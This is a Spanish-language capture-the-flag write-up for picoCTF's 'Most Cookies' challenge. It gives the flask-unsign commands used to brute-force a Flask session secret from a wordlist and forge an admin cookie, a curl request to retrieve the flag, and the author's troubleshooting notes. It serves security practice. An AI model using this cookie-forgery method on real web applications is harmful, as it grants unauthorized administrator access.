
## Reto
Most Cookies

## Descripcion
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/60f76192f6e1fea6f4e6e8c5fc9a6a27/server.py) [http://mercury.picoctf.net:44693/](http://mercury.picoctf.net:44693/

## Solucion
- Abrimos la pagina y nos da un cuadro de texto
- Al poner cualquier cosa nos genera una cookie encriptada con flask
- para desincreptarla usaremos flask-unsign de python
- al tratar de instalarlo nos marca error por lo que usaremos un entorno virtual
```
python -m venv ~/.venv 
source ~/.venv/bin/activate 
pip3 install flask-unsign
```
- como nos dieron el codigo fuente con todas las listas de palabras creamos `nano cookies.txt` y dentro ponemos la lista de todas las palabras posibles separadas por salto de linea
- usando esa lista aplicamos `flask-unsign --unsign --cookie "[cookie copiada]" --wordlist cookies.txt` y nos regresa la palabra secreta

- Con la palabra secreta ahora aplicamos `flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret '[palabra secreta]'`
  y nos regresa una cookie de admin

- Ahora aplicamos `curl -s [link de pagina]/display -H "Cookie: session=[cookie admin]" | grep pico` para que nos regrese la respuesta de admin y encontrar la bandera facil con un grep: **picoCTF{pwn_4ll_th3_cook1E5_dbfe90bf}**

## ALT
- correr un script que no me funciono :v
## Notas
- una cookie de flask no es muy segura y depende de como las configuramos
## Errores
### No se porque nomas me funciono una vez pero la bandera no sirvio y ya no volvio a servir

<img width="1047" height="589" alt="image" src="https://github.com/user-attachments/assets/f07d5ff1-218b-4517-8062-016569e29ef8" />
## Correcion
- al aplicar `flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret '[palabra secreta]'` estaba poniendo tambien la cookie copiada, y solo tenia que dar enter para que generara la cookie de admin
- Al aplicar el curl estaba usando el link copiado del discord, pero necesitaba copiar el que tenia en mi propio navegador
- Ahora me pregunta porque si sirvio 1 vez si lo tenia todo mal

## Referencias
[PicoCTF 2021 — Most Cookies - Private User HQ - Medium](https://medium.com/private-user-hq/picoctf-2021-most-cookies-7f3d8b6cd0b)
[picoCTF 2021 - [ Web ] - Most Cookies - YouTube](https://www.youtube.com/watch?v=ufs1xqSQCUM&list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&index=66)
